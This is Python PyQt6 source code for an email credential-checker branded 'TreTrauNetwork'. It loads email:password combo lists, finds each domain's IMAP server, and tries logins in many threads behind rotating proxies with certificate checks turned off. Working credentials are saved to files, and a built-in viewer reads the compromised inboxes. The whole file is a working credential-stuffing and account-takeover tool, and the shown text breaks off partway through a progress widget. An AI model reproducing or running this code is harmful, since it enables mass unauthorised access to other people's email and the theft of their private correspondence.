#!/usr/bin/env python3
# TreTrauNetwork — Make by @thaituluckkystopdz

import sys, os, re, ssl, json, time, socket, threading, itertools, imaplib
import email as email_mod
import webbrowser
from email.header import decode_header as _dh
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional, List, Dict, Tuple
from datetime import datetime

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QPushButton, QLineEdit, QTextEdit, QSplitter, QFrame,
    QFileDialog, QTableView, QHeaderView, QDialog, QScrollArea,
    QProgressBar, QSpinBox, QTabWidget, QSizePolicy, QAbstractItemView,
    QMessageBox, QComboBox, QPlainTextEdit, QListWidget, QListWidgetItem
)
from PyQt6.QtCore import (
    Qt, QThread, pyqtSignal, QAbstractTableModel, QModelIndex,
    QVariant, QTimer, QSize, QSortFilterProxyModel
)
from PyQt6.QtGui import (
    QColor, QPainter, QPen, QBrush, QFont, QPainterPath, QLinearGradient
)

try:
    from PyQt6.QtWebEngineWidgets import QWebEngineView
    _HAS_WEB = True
except ImportError:
    _HAS_WEB = False

import urllib.request

# TreTrauNetwork — Make by @thaituluckkystopdz — config
_DAT      = os.path.join(os.path.dirname(os.path.abspath(__file__)), "hoster.dat")
_PREFIXES = ["imap","mail","imap-mail","inbound","mx","imaps","m","webmail"]
_IMAP_PORT = 993
_TG_LINK   = "https://t.me/+0C1-UBcsHLBiOGVl"

_CHECK_APIS = [
    "https://api.ipify.org?format=json",
    "https://api4.my-ip.io/ip.json",
    "https://ipinfo.io/json",
]

# TreTrauNetwork — Make by @thaituluckkystopdz — colors
NEON_BLUE   = "#00d4ff"
NEON_PURPLE = "#9d00ff"
NEON_PINK   = "#ff00aa"
NEON_GREEN  = "#00ff88"
NEON_ORANGE = "#ff8800"
NEON_YELLOW = "#ffdd00"
BG_DARK     = "#0a0a0a"
BG_CARD     = "#0f0f1a"
BG_ROW      = "#111122"
BORDER_DIM  = "#1e1e30"

QSS = f"""
QMainWindow, QWidget {{ background:{BG_DARK}; color:#e0e0ff; font-family:'Consolas','Courier New',monospace; }}
QTabWidget::pane {{ border:1px solid {NEON_PURPLE}55; background:{BG_CARD}; }}
QTabBar::tab {{ background:#0d0d20; color:#888; padding:8px 18px; border:1px solid {BORDER_DIM}; border-bottom:none; }}
QTabBar::tab:selected {{ background:{BG_CARD}; color:{NEON_BLUE}; border-color:{NEON_PURPLE}; }}
QTableView {{ background:{BG_DARK}; gridline-color:#1a1a2e; color:#d0d0ff;
              border:1px solid {NEON_PURPLE}44; selection-background-color:{NEON_PURPLE}33; }}
QHeaderView::section {{ background:#0d0d20; color:{NEON_BLUE}; border:1px solid {BORDER_DIM}; padding:4px; }}
QLineEdit, QPlainTextEdit, QTextEdit, QSpinBox, QComboBox {{
    background:#0d0d20; color:#e0e0ff; border:1px solid {NEON_PURPLE}55;
    border-radius:4px; padding:4px 8px; }}
QLineEdit:focus, QPlainTextEdit:focus {{ border-color:{NEON_BLUE}; }}
QPushButton {{ background:#0d0d20; color:{NEON_BLUE}; border:1px solid {NEON_BLUE}55;
               border-radius:4px; padding:6px 14px; }}
QPushButton:hover {{ background:{NEON_BLUE}22; border-color:{NEON_BLUE}; }}
QPushButton:disabled {{ color:#444; border-color:#333; }}
QScrollBar:vertical {{ background:#0d0d20; width:8px; }}
QScrollBar::handle:vertical {{ background:{NEON_PURPLE}66; border-radius:4px; min-height:20px; }}
QProgressBar {{ background:#0d0d20; border:1px solid {NEON_PURPLE}44; border-radius:3px; text-align:center; color:#fff; }}
QProgressBar::chunk {{ background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 {NEON_PURPLE},stop:1 {NEON_BLUE}); }}
QSplitter::handle {{ background:{BORDER_DIM}; }}
QLabel {{ color:#d0d0ff; }}
"""

# TreTrauNetwork — Make by @thaituluckkystopdz — host cache
class HostCache:
    _lock   = threading.Lock()
    _mem:    Dict[str, Tuple[str,int]] = {}
    _loaded = False

    @classmethod
    def _load(cls):
        if cls._loaded: return
        cls._loaded = True
        if not os.path.exists(_DAT): return
        try:
            with open(_DAT, encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"): continue
                    parts = line.split(":")
                    if len(parts) >= 3:
                        cls._mem[parts[0]] = (parts[1], int(parts[2]))
        except Exception: pass

    @classmethod
    def get(cls, domain: str) -> Optional[Tuple[str,int]]:
        with cls._lock:
            cls._load()
            if domain in cls._mem: return cls._mem[domain]
            for k,v in cls._mem.items():
                if domain.endswith("."+k) or k.endswith("."+domain): return v
        return None

    @classmethod
    def put(cls, domain: str, host: str, port: int = 993):
        with cls._lock:
            cls._load()
            cls._mem[domain] = (host, port)
            try:
                lines = []
                if os.path.exists(_DAT):
                    with open(_DAT, encoding="utf-8") as f:
                        lines = [l for l in f if not l.startswith(domain+":")]
                lines.append(f"{domain}:{host}:{port}\n")
                with open(_DAT, "w", encoding="utf-8") as f:
                    f.writelines(lines)
            except Exception: pass


def resolve_server(email_addr: str) -> Tuple[Optional[str], int]:
    domain = email_addr.split("@")[-1].lower().strip()
    cached = HostCache.get(domain)
    if cached: return cached
    for prefix in _PREFIXES:
        host = f"{prefix}.{domain}"
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            old = socket.getdefaulttimeout()
            socket.setdefaulttimeout(3)
            try:
                with imaplib.IMAP4_SSL(host, _IMAP_PORT, ssl_context=ctx) as m:
                    if m.state == "NONAUTH":
                        HostCache.put(domain, host, _IMAP_PORT)
                        return host, _IMAP_PORT
            finally:
                socket.setdefaulttimeout(old)
        except Exception: pass
    return None, _IMAP_PORT


# TreTrauNetwork — Make by @thaituluckkystopdz — proxy
def parse_proxy(raw: str) -> Optional[str]:
    raw = raw.strip()
    if not raw: return None
    if raw.startswith(("http://","https://","socks5://","socks4://")): return raw
    parts = raw.split(":")
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if len(parts) == 2: return f"http://{raw}"
    return None

class ProxyRotator:
    def __init__(self, proxies: List[str]):
        self._cycle = itertools.cycle(proxies) if proxies else None
        self._lock  = threading.Lock()
    def next(self) -> Optional[str]:
        if not self._cycle: return None
        with self._lock: return next(self._cycle)
    def empty(self) -> bool: return self._cycle is None


# TreTrauNetwork — Make by @thaituluckkystopdz — email parsing
def _decode_str(s):
    if isinstance(s, bytes):
        try: return s.decode("utf-8", errors="replace")
        except: return s.decode("latin-1", errors="replace")
    return s or ""

def _decode_header(h: str) -> str:
    parts = _dh(h or "")
    out = []
    for raw, enc in parts:
        if isinstance(raw, bytes):
            out.append(raw.decode(enc or "utf-8", errors="replace"))
        else:
            out.append(raw)
    return "".join(out)

def _safe_decode(payload: bytes, charset: str) -> str:
    for enc in [charset, "utf-8", "latin-1", "cp1252"]:
        if not enc: continue
        try:
            return payload.decode(enc, errors="replace")
        except (LookupError, UnicodeDecodeError):
            continue
    return payload.decode("latin-1", errors="replace")

def _extract_body(msg) -> Tuple[str, bool]:
    html_part = plain_part = ""
    if msg.is_multipart():
        for part in msg.walk():
            ct = part.get_content_type()
            cd = str(part.get("Content-Disposition",""))
            if "attachment" in cd: continue
            payload = part.get_payload(decode=True)
            if payload is None: continue
            charset = part.get_content_charset() or "utf-8"
            text = _safe_decode(payload, charset)
            if ct == "text/html" and not html_part:     html_part  = text
            elif ct == "text/plain" and not plain_part: plain_part = text
    else:
        payload = msg.get_payload(decode=True)
        if payload:
            charset = msg.get_content_charset() or "utf-8"
            text = _safe_decode(payload, charset)
            if msg.get_content_type() == "text/html": html_part  = text
            else:                                      plain_part = text
    if html_part: return html_part, True
    return plain_part, False

_DARK_CSS = """<style>
body{background:#0a0a0a!important;color:#d0d0ff!important;font-family:Consolas,monospace!important;}
a{color:#00d4ff!important;} *{border-color:#1e1e30!important;}
</style>"""

def _inject_css(html: str) -> str:
    if "</head>" in html.lower():
        return re.sub(r"</head>", _DARK_CSS+"</head>", html, flags=re.IGNORECASE, count=1)
    return _DARK_CSS + html


# TreTrauNetwork — Make by @thaituluckkystopdz — save helpers
def _make_save_dir(base: str) -> str:
    folder = os.path.join(base, "rules-" + datetime.now().strftime("%d-%m-%Y"))
    os.makedirs(folder, exist_ok=True)
    return folder

def _save_line(folder: str, fname: str, line: str):
    try:
        with open(os.path.join(folder, fname), "a", encoding="utf-8") as f:
            f.write(line+"\n")
    except Exception: pass

def _save_domain(folder: str, domain: str, line: str):
    try:
        d = os.path.join(folder, "domain")
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, f"{domain}.txt"), "a", encoding="utf-8") as f:
            f.write(line+"\n")
    except Exception: pass

def _save_keybrowser(folder: str, keyword: str, email: str, pwd: str, preview: str):
    try:
        d = os.path.join(folder, "keybrowser")
        os.makedirs(d, exist_ok=True)
        safe = re.sub(r'[^\w]', '_', keyword)[:30]
        with open(os.path.join(d, f"{safe}.txt"), "a", encoding="utf-8") as f:
            f.write(f"{email}:{pwd}  {preview}\n")
    except Exception: pass


# TreTrauNetwork — Make by @thaituluckkystopdz — stats
class Stats:
    def __init__(self):
        self.total = self.checked = self.hits = self.bad = self.block = self.errors = 0
    def reset(self):
        self.total = self.checked = self.hits = self.bad = self.block = self.errors = 0


# TreTrauNetwork — Make by @thaituluckkystopdz — result model
C_EMAIL, C_PASS, C_STATUS, C_MCNT, C_PREV = range(5)
_HEADERS = ["Email", "Password", "Status", "Mails", "Preview"]

_BLOCK_KEYWORDS = ["lock","block","suspend","disabled","banned","deactivat","frozen","restrict"]

STATUS_COLOR = {
    "HIT":   NEON_GREEN,
    "BAD":   "#ff4444",
    "BLOCK": NEON_YELLOW,
    "ERROR": NEON_ORANGE,
    "WAIT":  "#555577",
}

class ResultModel(QAbstractTableModel):
    def __init__(self):
        super().__init__()
        self._rows: List[List] = []
        self._lock = threading.Lock()

    def rowCount(self, _=QModelIndex()): return len(self._rows)
    def columnCount(self, _=QModelIndex()): return 5

    def headerData(self, s, o, r=Qt.ItemDataRole.DisplayRole):
        if r == Qt.ItemDataRole.DisplayRole and o == Qt.Orientation.Horizontal:
            return _HEADERS[s]
        return QVariant()

    def data(self, idx, role=Qt.ItemDataRole.DisplayRole):
        if not idx.isValid(): return QVariant()
        row = self._rows[idx.row()]
        col = idx.column()
        if role == Qt.ItemDataRole.DisplayRole:
            return str(row[col]) if row[col] is not None else ""
        if role == Qt.ItemDataRole.ForegroundRole:
            return QColor(STATUS_COLOR.get(row[C_STATUS], "#8888aa"))
        if role == Qt.ItemDataRole.BackgroundRole:
            return QColor(BG_ROW if idx.row()%2==0 else "#0d0d1e")
        return QVariant()

    def add_row(self, email, pwd, status="WAIT", mcnt=0, preview=""):
        with self._lock:
            r = len(self._rows)
            self.beginInsertRows(QModelIndex(), r, r)
            self._rows.append([email, pwd, status, mcnt, preview])
            self.endInsertRows()

    def update_row(self, idx: int, status: str, mcnt: int = 0, preview: str = ""):
        with self._lock:
            if 0 <= idx < len(self._rows):
                self._rows[idx][C_STATUS] = status
                self._rows[idx][C_MCNT]   = mcnt
                self._rows[idx][C_PREV]   = preview
                self.dataChanged.emit(self.index(idx, C_STATUS), self.index(idx, C_PREV))

    def clear(self):
        self.beginResetModel()
        self._rows.clear()
        self.endResetModel()

    def get_email(self, idx): return self._rows[idx][C_EMAIL]
    def get_pass(self, idx):  return self._rows[idx][C_PASS]
    def get_status(self, idx): return self._rows[idx][C_STATUS]


# TreTrauNetwork — Make by @thaituluckkystopdz — filter proxy model
class StatusFilterProxy(QSortFilterProxyModel):
    def __init__(self):
        super().__init__()
        self._status_filter = ""   # "" = all
        self._keyword       = ""
        self.setFilterCaseSensitivity(Qt.CaseSensitivity.CaseInsensitive)

    def set_status(self, s: str):
        self._status_filter = s
        self.invalidateFilter()

    def set_keyword(self, kw: str):
        self._keyword = kw.lower()
        self.invalidateFilter()

    def filterAcceptsRow(self, row, parent):
        src = self.sourceModel()
        if src is None: return True
        status  = src._rows[row][C_STATUS]
        email   = src._rows[row][C_EMAIL].lower()
        preview = src._rows[row][C_PREV].lower()
        if self._status_filter and status != self._status_filter:
            return False
        if self._keyword and self._keyword not in email and self._keyword not in preview:
            return False
        return True


# TreTrauNetwork — Make by @thaituluckkystopdz — check worker
class CheckWorker(QThread):
    row_done = pyqtSignal(int, str, int, str)
    finished = pyqtSignal(int, int, int, int)
    progress = pyqtSignal(int)

    def __init__(self, combos: List[Tuple[int,str,str]], threads: int,
                 rotator: ProxyRotator, keyword: str = ""):
        super().__init__()
        self._combos  = combos
        self._threads = threads
        self._rotator = rotator
        self._kw      = keyword.lower()
        self._stop    = False
        self._hits = self._bad = self._block = self._errs = 0
        self._lock = threading.Lock()

    def stop(self): self._stop = True

    def _check(self, idx: int, email: str, pwd: str):
        if self._stop: return
        host, port = resolve_server(email)
        if not host:
            with self._lock: self._errs += 1
            self.row_done.emit(idx, "ERROR", 0, "No IMAP host")
            self.progress.emit(1)
            return
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            m = imaplib.IMAP4_SSL(host, port, ssl_context=ctx)
            m.login(email, pwd)
            m.select("INBOX", readonly=True)
            _, data = m.search(None, "ALL")
            ids = data[0].split() if data[0] else []
            mcnt = len(ids)
            preview = ""
            if ids:
                _, raw = m.fetch(ids[-1], "(BODY.PEEK[HEADER.FIELDS (SUBJECT FROM)])")
                if raw and raw[0]:
                    part = raw[0][1] if isinstance(raw[0], tuple) else raw[0]
                    hdr  = email_mod.message_from_bytes(part)
                    subj = _decode_header(hdr.get("Subject",""))
                    frm  = _decode_header(hdr.get("From",""))
                    preview = f"{frm}: {subj}"[:100]
            m.logout()
            with self._lock: self._hits += 1
            self.row_done.emit(idx, "HIT", mcnt, preview)
        except imaplib.IMAP4.error as e:
            err_msg = str(e).lower()
            if any(k in err_msg for k in _BLOCK_KEYWORDS):
                with self._lock: self._block += 1
                self.row_done.emit(idx, "BLOCK", 0, str(e)[:60])
            else:
                with self._lock: self._bad += 1
                self.row_done.emit(idx, "BAD", 0, "")
        except Exception as e:
            with self._lock: self._errs += 1
            self.row_done.emit(idx, "ERROR", 0, str(e)[:60])
        self.progress.emit(1)

    def run(self):
        with ThreadPoolExecutor(max_workers=self._threads) as ex:
            futs = {ex.submit(self._check, i, em, pw): i for i,em,pw in self._combos}
            for f in as_completed(futs):
                try: f.result()
                except Exception: pass
        self.finished.emit(self._hits, self._bad, self._block, self._errs)


# TreTrauNetwork — Make by @thaituluckkystopdz — IMAP body worker
class ImapBodyWorker(QThread):
    fetched = pyqtSignal(str, bool)

    def __init__(self, email_addr: str, pwd: str, msg_id: bytes):
        super().__init__()
        self._email = email_addr
        self._pwd   = pwd
        self._mid   = msg_id

    def run(self):
        try:
            host, port = resolve_server(self._email)
            if not host:
                self.fetched.emit("Cannot resolve IMAP host.", False); return
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            m = imaplib.IMAP4_SSL(host, port, ssl_context=ctx)
            m.login(self._email, self._pwd)
            m.select("INBOX", readonly=True)
            _, raw = m.fetch(self._mid, "(RFC822)")
            m.logout()
            if not raw or not raw[0]:
                self.fetched.emit("Empty response.", False); return
            data = raw[0][1] if isinstance(raw[0], tuple) else raw[0]
            msg  = email_mod.message_from_bytes(data)
            body, is_html = _extract_body(msg)
            if is_html: body = _inject_css(body)
            self.fetched.emit(body or "(empty)", is_html)
        except Exception as e:
            self.fetched.emit(f"Error: {e}", False)


# TreTrauNetwork — Make by @thaituluckkystopdz — proxy check worker
class ProxyCheckWorker(QThread):
    result_sig = pyqtSignal(int, str, str)
    done_sig   = pyqtSignal(int, int)

    def __init__(self, proxies: List[Tuple[int,str]]):
        super().__init__()
        self._proxies = proxies
        self._alive = self._dead = 0
        self._lock = threading.Lock()

    def _test(self, idx: int, raw: str):
        url = parse_proxy(raw)
        if not url:
            self.result_sig.emit(idx, "INVALID", "")
            with self._lock: self._dead += 1
            return
        try:
            pm     = urllib.request.ProxyHandler({"http": url, "https": url})
            opener = urllib.request.build_opener(pm)
            resp   = opener.open(_CHECK_APIS[0], timeout=8)
            data   = json.loads(resp.read().decode())
            ip     = data.get("ip", data.get("query","?"))
            self.result_sig.emit(idx, "ALIVE", ip)
            with self._lock: self._alive += 1
        except Exception:
            self.result_sig.emit(idx, "DEAD", "")
            with self._lock: self._dead += 1

    def run(self):
        with ThreadPoolExecutor(max_workers=50) as ex:
            futs = {ex.submit(self._test, i, p): (i,p) for i,p in self._proxies}
            for f in as_completed(futs):
                try: f.result()
                except Exception: pass
        self.done_sig.emit(self._alive, self._dead)


# TreTrauNetwork — Make by @thaituluckkystopdz — pie chart widget
class PieChart(QWidget):
    def __init__(self):
        super().__init__()
        self._data = (0, 0, 0, 0)
        self.setMinimumSize(220, 160)

    def set_data(self, hits: int, bad: int, block: int, errors: int):
        self._data = (hits, bad, block, errors)
        self.update()

    def paintEvent(self, _):
        h, b, bl, e = self._data
        total = h + b + bl + e
        p = QPainter(self)
        p.setRenderHint(QPainter.RenderHint.Antialiasing)

        legend_w = 110
        cw   = self.width() - legend_w
        side = min(cw, self.height()) - 16
        x    = (cw - side) // 2
        y    = (self.height() - side) // 2

        if total == 0:
            pen = QPen(QColor(NEON_PURPLE + "55"))
            pen.setWidth(3)
            p.setPen(pen)
            p.setBrush(QBrush(QColor(NEON_PURPLE + "11")))
            p.drawEllipse(x, y, side, side)
            hole = int(side * 0.55)
            p.setBrush(QBrush(QColor(BG_DARK))); p.setPen(Qt.PenStyle.NoPen)
            p.drawEllipse(x+(side-hole)//2, y+(side-hole)//2, hole, hole)
            p.setFont(QFont("Consolas", 9))
            p.setPen(QPen(QColor(NEON_PURPLE + "99")))
            p.drawText(x, y, side, side, Qt.AlignmentFlag.AlignCenter, "WAITING")
            p.end(); return

        slices = [
            (h,  QColor(NEON_GREEN),  "Hits"),
            (b,  QColor("#ff4444"),   "Bad"),
            (bl, QColor(NEON_YELLOW), "Block"),
            (e,  QColor(NEON_ORANGE), "Errors"),
        ]
        angle = 90 * 16
        for val, color, _ in slices:
            if val == 0: continue
            span = int(val / total * 360 * 16)
            p.setBrush(QBrush(color)); p.setPen(Qt.PenStyle.NoPen)
            p.drawPie(x, y, side, side, angle, span)
            angle += span

        hole = int(side * 0.55)
        p.setBrush(QBrush(QColor(BG_DARK))); p.setPen(Qt.PenStyle.NoPen)
        p.drawEllipse(x+(side-hole)//2, y+(side-hole)//2, hole, hole)

        lx = cw + 6
        ly = (self.height() - len(slices) * 22) // 2
        p.setFont(QFont("Consolas", 8))
        for i, (val, color, label) in enumerate(slices):
            ry = ly + i * 22
            p.setBrush(QBrush(color)); p.setPen(Qt.PenStyle.NoPen)
            p.drawEllipse(lx, ry+3, 10, 10)
            p.setPen(QPen(QColor("#d0d0ff")))
            p.drawText(lx+14, ry+13, f"{label}: {val}")
        p.end()


# TreTrauNetwork — Make by @thaituluckkystopdz — stat card
class StatCard(QFrame):
    def __init__(self, label: str, color: str = NEON_BLUE):
        super().__init__()
        self._color = color
        self.setFrameShape(QFrame.Shape.StyledPanel)
        self.setStyleSheet(f"QFrame{{background:{BG_CARD};border:1px solid {BORDER_DIM};border-radius:6px;}}")
        lo = QVBoxLayout(self)
        lo.setContentsMargins(10, 8, 10, 8)
        self._val = QLabel("0")
        self._val.setFont(QFont("Consolas", 20, QFont.Weight.Bold))
        self._val.setStyleSheet(f"color:{color}55;border:none;")
        self._val.setAlignment(Qt.AlignmentFlag.AlignCenter)
        lbl = QLabel(label.upper())
        lbl.setFont(QFont("Consolas", 7))
        lbl.setStyleSheet("color:#555;border:none;letter-spacing:2px;")
        lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        lo.addWidget(self._val); lo.addWidget(lbl)

    def set(self, v: int):
        self._val.setText(str(v))
        self._val.setStyleSheet(f"color:{self._color}{'ff' if v>0 else '55'};border:none;")


# TreTrauNetwork — Make by @thaituluckkystopdz — async list loader
class ImapListWorker(QThread):
    """Fetches inbox header list in background — never blocks UI."""
    item_ready = pyqtSignal(bytes, str, str, str)   # mid, date, frm, subj
    done       = pyqtSignal(int)                     # total count
    error      = pyqtSignal(str)

    def __init__(self, email_addr: str, pwd: str, limit: int = 60):
        super().__init__()
        self._email = email_addr
        self._pwd   = pwd
        self._limit = limit

    def run(self):
        try:
            host, port = resolve_server(self._email)
            if not host:
                self.error.emit("Cannot resolve IMAP host"); return
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            m = imaplib.IMAP4_SSL(host, port, ssl_context=ctx)
            m.login(self._email, self._pwd)
            m.select("INBOX", readonly=True)
            _, data = m.search(None, "ALL")
            ids = data[0].split() if data[0] else []
            ids = ids[-self._limit:][::-1]
            for mid in ids:
                _, raw = m.fetch(mid, "(BODY.PEEK[HEADER.FIELDS (SUBJECT FROM DATE)])")
                if raw and raw[0]:
                    part = raw[0][1] if isinstance(raw[0], tuple) else raw[0]
                    hdr  = email_mod.message_from_bytes(part)
                    subj = _decode_header(hdr.get("Subject", "(no subject)"))
                    frm  = _decode_header(hdr.get("From", ""))
                    date = hdr.get("Date", "")[:16]
                else:
                    subj = f"(id {mid.decode()})"
                    frm  = date = ""
                self.item_ready.emit(mid, date, frm, subj)
            m.logout()
            self.done.emit(len(ids))
        except Exception as e:
            self.error.emit(str(e))


# TreTrauNetwork — Make by @thaituluckkystopdz — mail viewer dialog (fully async, QSplitter)
class MailViewer(QDialog):
    def __init__(self, parent, email_addr: str, pwd: str):
        super().__init__(parent)
        self.setWindowTitle(f"◈ Mail Viewer  —  {email_addr}")
        self.resize(1100, 720)
        self.setMinimumSize(800, 500)
        self.setStyleSheet(f"""
            QDialog   {{ background:{BG_DARK}; color:#d0d0ff; }}
            QListWidget {{
                background:#090914; color:#c0c0ff;
                border:none; border-right:1px solid {NEON_PURPLE}44;
                font-family:Consolas,monospace; font-size:11px;
            }}
            QListWidget::item {{ padding:6px 10px; border-bottom:1px solid {BORDER_DIM}; }}
            QListWidget::item:selected {{
                background:{NEON_PURPLE}33; color:{NEON_BLUE};
                border-left:3px solid {NEON_BLUE};
            }}
            QListWidget::item:hover {{ background:{NEON_PURPLE}18; }}
            QLabel {{ color:#d0d0ff; }}
            QPushButton {{
                background:#0d0d20; color:{NEON_BLUE};
                border:1px solid {NEON_BLUE}55; border-radius:4px; padding:5px 12px;
            }}
            QPushButton:hover {{ background:{NEON_BLUE}22; border-color:{NEON_BLUE}; }}
        """)

        self._email   = email_addr
        self._pwd     = pwd
        self._ids:    List[bytes] = []
        self._list_w: Optional[ImapListWorker]  = None
        self._body_w: Optional[ImapBodyWorker]  = None

        # ── layout ──────────────────────────────
        root = QVBoxLayout(self)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        # header bar
        bar = QFrame()
        bar.setStyleSheet(f"background:#090914;border-bottom:1px solid {NEON_PURPLE}44;")
        bar.setFixedHeight(42)
        bar_lo = QHBoxLayout(bar)
        bar_lo.setContentsMargins(12, 0, 12, 0)
        icon = QLabel("◈")
        icon.setStyleSheet(f"color:{NEON_PURPLE};font-size:16px;")
        addr = QLabel(email_addr)
        addr.setStyleSheet(f"color:{NEON_BLUE};font-size:12px;font-weight:bold;")
        self._status = QLabel("Connecting…")
        self._status.setStyleSheet(f"color:{NEON_PURPLE};font-size:10px;")
        bar_lo.addWidget(icon)
        bar_lo.addWidget(addr)
        bar_lo.addStretch()
        bar_lo.addWidget(self._status)
        root.addWidget(bar)

        # splitter: left list | right content
        sp = QSplitter(Qt.Orientation.Horizontal)
        sp.setHandleWidth(2)
        sp.setStyleSheet(f"QSplitter::handle{{background:{NEON_PURPLE}44;}}")

        # left — mail list
        left = QWidget()
        left.setStyleSheet(f"background:#090914;")
        left_lo = QVBoxLayout(left)
        left_lo.setContentsMargins(0, 0, 0, 0)
        left_lo.setSpacing(0)

        list_hdr = QLabel("  INBOX")
        list_hdr.setFixedHeight(28)
        list_hdr.setStyleSheet(
            f"background:#0d0d20;color:{NEON_PURPLE};font-size:9px;"
            f"letter-spacing:2px;border-bottom:1px solid {BORDER_DIM};"
            f"padding-left:8px;"
        )
        left_lo.addWidget(list_hdr)

        self._list_widget = QListWidget()
        self._list_widget.setWordWrap(False)
        self._list_widget.currentRowChanged.connect(self._on_row_changed)
        left_lo.addWidget(self._list_widget, 1)

        self._load_bar = QProgressBar()
        self._load_bar.setRange(0, 0)   # indeterminate
        self._load_bar.setFixedHeight(3)
        self._load_bar.setTextVisible(False)
        self._load_bar.setStyleSheet(
            f"QProgressBar{{background:{BG_DARK};border:none;}}"
            f"QProgressBar::chunk{{background:{NEON_PURPLE};}}"
        )
        left_lo.addWidget(self._load_bar)
        sp.addWidget(left)

        # right — content
        right = QWidget()
        right.setStyleSheet(f"background:{BG_DARK};")
        right_lo = QVBoxLayout(right)
        right_lo.setContentsMargins(0, 0, 0, 0)
        right_lo.setSpacing(0)

        content_hdr = QLabel("  EMAIL CONTENT")
        content_hdr.setFixedHeight(28)
        content_hdr.setStyleSheet(
            f"background:#0d0d20;color:{NEON_BLUE};font-size:9px;"
            f"letter-spacing:2px;border-bottom:1px solid {BORDER_DIM};"
            f"padding-left:8px;"
        )
        right_lo.addWidget(content_hdr)

        if _HAS_WEB:
            self._view = QWebEngineView()
            self._view.setStyleSheet(f"background:{BG_DARK};")
            # show placeholder page while idle
            self._view.setHtml(
                f"<html><body style='background:{BG_DARK};color:{NEON_PURPLE}88;"
                f"font-family:Consolas;display:flex;align-items:center;"
                f"justify-content:center;height:100vh;margin:0;'>"
                f"<p>← Select a message</p></body></html>"
            )
        else:
            self._view = QTextEdit()
            self._view.setReadOnly(True)
            self._view.setStyleSheet(f"background:{BG_DARK};color:#d0d0ff;border:none;")
            self._view.setPlaceholderText("← Select a message")

        right_lo.addWidget(self._view, 1)

        self._body_spinner = QProgressBar()
        self._body_spinner.setRange(0, 0)
        self._body_spinner.setFixedHeight(2)
        self._body_spinner.setTextVisible(False)
        self._body_spinner.setVisible(False)
        self._body_spinner.setStyleSheet(
            f"QProgressBar{{background:{BG_DARK};border:none;}}"
            f"QProgressBar::chunk{{background:{NEON_BLUE};}}"
        )
        right_lo.addWidget(self._body_spinner)
        sp.addWidget(right)

        sp.setSizes([320, 780])
        root.addWidget(sp, 1)

        # start loading list in background
        QTimer.singleShot(50, self._start_list_load)

    def _start_list_load(self):
        self._list_w = ImapListWorker(self._email, self._pwd)
        self._list_w.item_ready.connect(self._on_item_ready)
        self._list_w.done.connect(self._on_list_done)
        self._list_w.error.connect(self._on_list_error)
        self._list_w.start()

    def _on_item_ready(self, mid: bytes, date: str, frm: str, subj: str):
        self._ids.append(mid)
        display = f"{date[:10]}  {frm[:24]}\n  {subj[:55]}"
        item = QListWidgetItem(display)
        item.setData(Qt.ItemDataRole.UserRole, len(self._ids) - 1)
        self._list_widget.addItem(item)

    def _on_list_done(self, count: int):
        self._load_bar.setVisible(False)
        self._status.setText(f"{count} messages — click to read")

    def _on_list_error(self, msg: str):
        self._load_bar.setVisible(False)
        self._status.setText(f"Error: {msg}")

    def _on_row_changed(self, row: int):
        if row < 0 or row >= len(self._ids): return
        self._load_body(self._ids[row])

    def _load_body(self, mid: bytes):
        self._status.setText("Loading…")
        self._body_spinner.setVisible(True)
        if self._body_w:
            self._body_w.quit()
            self._body_w.wait()
        self._body_w = ImapBodyWorker(self._email, self._pwd, mid)
        self._body_w.fetched.connect(self._show_body)
        self._body_w.start()

    def _show_body(self, body: str, is_html: bool):
        self._body_spinner.setVisible(False)
        self._status.setText("Ready")
        if not is_html:
            body = (
                f"<html><body style='background:{BG_DARK};color:#d0d0ff;"
                f"font-family:Consolas,monospace;padding:16px;white-space:pre-wrap;"
                f"word-wrap:break-word;'>{body}</body></html>"
            )
            is_html = True
        if _HAS_WEB:
            self._view.setHtml(body)
        else:
            self._view.setHtml(body)

    def closeEvent(self, ev):
        for w in [self._list_w, self._body_w]:
            if w and w.isRunning():
                w.quit(); w.wait()
        super().closeEvent(ev)


# TreTrauNetwork — Make by @thaituluckkystopdz — ring progress widget
class RingProgress(QWidget):
    def __init__(self):
        super().__init__()
        self._pct = 0.0
        self._rate = 0.0
        self.setMinimumSize(140, 140)
        self.setMaximumSize(160, 160)

    def set_data(self, checked: int, total: int, rate: float):
        self._pct  = checked / total if total > 0 else 0.0
        self._rate = rate
        self.update()

    def paintEvent(self, _):
        p = QPainter(self)
        p.setRenderHint(QPainter.RenderHint.Antialiasing)
        w, h = self.width(), self.height()
        cx, cy = w // 2, h // 2
        r = min(w, h) // 2 - 10
        thick = 12

        # background ring
        pen = QPen(QColor(BORDER_DIM)); pen.setWidth(thick); pen.setCapStyle(Qt.PenCapStyle.RoundCap)
        p.setPen(pen); p.setBrush(Qt.BrushStyle.NoBrush)
        p.drawEllipse(cx - r, cy - r, r * 2, r * 2)

        # progress arc
        if self._pct > 0:
            grad = QLinearGradient(cx - r, cy, cx + r, cy)
            grad.setColorAt(0, QColor(NEON_PURPLE))
            grad.setColorAt(1, QColor(NEON_BLUE))
            pen2 = QPen(QBrush(grad), thick)
            pen2.setCapStyle(Qt.PenCapStyle.RoundCap)
            p.setPen(pen2)
            span = int(-self._pct * 360 * 16)
            p.drawArc(cx - r, cy - r, r * 2, r * 2, 90 * 16, span)

        # center text
        p.setPen(QPen(QColor(NEON_BLUE)))
        p.setFont(QFont("Consolas", 14, QFont.Weight.Bold))
        p.drawText(0, 0, w, h, Qt.AlignmentFlag.AlignCenter,
                   f"{int(self._pct*100)}%")
        p.setPen(QPen(QColor(NEON_PURPLE + "aa")))
        p.setFont(QFont("Consolas", 7))
